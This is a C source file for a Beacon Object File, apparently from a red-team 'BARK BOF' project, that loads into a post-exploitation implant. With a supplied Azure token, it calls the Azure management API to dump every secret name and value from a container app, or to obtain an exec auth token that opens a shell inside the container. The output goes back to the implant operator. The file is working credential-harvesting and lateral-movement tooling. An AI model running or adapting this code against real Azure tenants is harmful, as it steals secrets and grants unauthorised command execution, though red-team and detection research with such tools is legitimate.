/*
 * get_azurerm_container_app_info.c — BARK BOF
 * Get-AzureRMContainerAppInfo — List secrets or get exec auth token
 *
 * Args : token, containerAppPath, infoType
 *
 * containerAppPath : full ARM path, e.g.
 *   /subscriptions/<subId>/resourceGroups/<rg>/providers/Microsoft.App/containerApps/<name>
 *
 * infoType : secrets | exec
 *   secrets — POST listSecrets; returns all secret names and values
 *   exec    — POST getAuthToken; returns auth token for websocket exec proxy
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    LPWSTR widePath = NULL;
    char  *token            = NULL;
    char  *containerAppPath = NULL;
    char  *infoType         = NULL;

    BeaconDataParse(&parser, args, alen);
    token            = BeaconDataExtract(&parser, NULL);
    containerAppPath = BeaconDataExtract(&parser, NULL);
    infoType         = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_azurerm_container_app_info <token> <containerAppPath> <secrets|exec>\n");
        return;
    }
    containerAppPath = SAFE_STR(containerAppPath);
    infoType         = SAFE_STR(infoType);

    if (MSVCRT$strcmp(infoType, "secrets") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMContainerAppInfo (secrets): %s\n", containerAppPath);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "%s/listSecrets?api-version=2024-03-01", containerAppPath);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkPost(L"management.azure.com", widePath, L"POST", "{}", token, "application/json");
    } else if (MSVCRT$strcmp(infoType, "exec") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMContainerAppInfo (exec): %s\n", containerAppPath);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "%s/getAuthToken?api-version=2024-03-01", containerAppPath);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkPost(L"management.azure.com", widePath, L"POST", "{}", token, "application/json");
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Unknown infoType '%s'. Supported: secrets, exec\n", infoType);
        return;
    }
    HFree(widePath);
}
